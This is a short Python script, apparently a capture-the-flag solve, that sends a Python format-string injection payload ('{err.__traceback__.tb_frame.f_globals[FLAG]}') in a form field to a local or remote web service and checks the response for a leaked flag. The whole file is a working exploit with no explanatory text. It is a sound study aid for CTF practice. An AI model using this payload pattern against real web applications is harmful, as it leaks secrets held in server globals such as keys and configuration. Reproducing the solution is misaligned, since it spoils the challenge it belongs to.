import argparse
from pwn import *
import requests

parser = argparse.ArgumentParser()
parser.add_argument("-R", action="store_true")
args = parser.parse_args()

REMOTE_HOST = "34.170.146.252"
REMOTE_PORT = 63465
LOCAL_HOST = "localhost"
LOCAL_PORT = 3000

if args.R:
    URL = f"http://{REMOTE_HOST}:{REMOTE_PORT}"
else:
    URL = f"http://{LOCAL_HOST}:{LOCAL_PORT}"

payload = {
    "custom-hello": "{WRONG}",
    "custom-error": "{err.__traceback__.tb_frame.f_globals[FLAG]}"
}

response = requests.get(
    URL,
    data=payload,
)

log.info(f"Status Code: {response.status_code}")

if "Alpaca{" in response.text:
    log.success(f"Flag found: {response.text.strip()}")
else:
    log.failure("Failed to retrieve flag.")
    print("--- Response Text ---")
    print(response.text)
